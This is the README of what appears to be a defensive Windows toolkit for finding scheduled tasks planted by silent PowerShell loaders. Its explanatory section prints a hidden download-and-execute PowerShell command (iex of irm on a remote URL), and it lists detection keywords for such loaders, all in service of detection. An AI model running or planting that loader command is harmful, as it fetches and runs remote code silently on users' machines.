# SilentLoaderHunter

SilentLoaderHunter is a defensive toolkit for detecting malicious Windows Scheduled Tasks used by silent PowerShell loaders and persistence-based malware.

---

## Emergency Quick Detection !

Run in Command Prompt as Administrator:

```cmd
schtasks /query /fo LIST /v > tasks.txt & findstr /i "powershell bypass hidden irm http https" tasks.txt
```

## 🎯 Problem

If you notice:

- CMD opening randomly
- PowerShell flashing briefly
- Suspicious "License Verified" messages
- High CPU usage at idle
- Tasks running with `-ExecutionPolicy Bypass`

Your system may be infected with a scheduled task-based loader.

---

## 🧠 How It Works

Modern Windows malware often creates a Scheduled Task that executes:

```

powershell.exe -NoP -Exec Bypass -W Hidden -Command "iex(irm <remote-url>)"

````

This technique:

- Downloads remote payload
- Executes silently
- Maintains persistence
- Evades casual detection

---

## 🚀 Quick Detection

Run the following in PowerShell (Admin):

```powershell
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -like "*powershell*" -or
    $_.Actions.Execute -like "*cmd*" -or
    $_.Actions.Execute -like "*wscript*" -or
    $_.Actions.Execute -like "*cscript*"
} | Select TaskName, TaskPath
````

Or use the included script:

```powershell
.\scripts\detect-script-engines.ps1
```

---

## 🛡 Hardening PowerShell

```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

This prevents unsigned downloaded scripts from running silently.

---

## 📁 Project Structure

```
SilentLoaderHunter/
│
├── scripts/
│   ├── detect-script-engines.ps1
│   ├── detect-suspicious-tasks.ps1
│   ├── check-execution-policy.ps1
│   ├── export-task-details.ps1
│   └── block-malicious-ip.ps1
│
└── docs/
```

---

## ⚠️ Disclaimer

This repository is intended for defensive security research and educational purposes only.

Do not use these techniques offensively.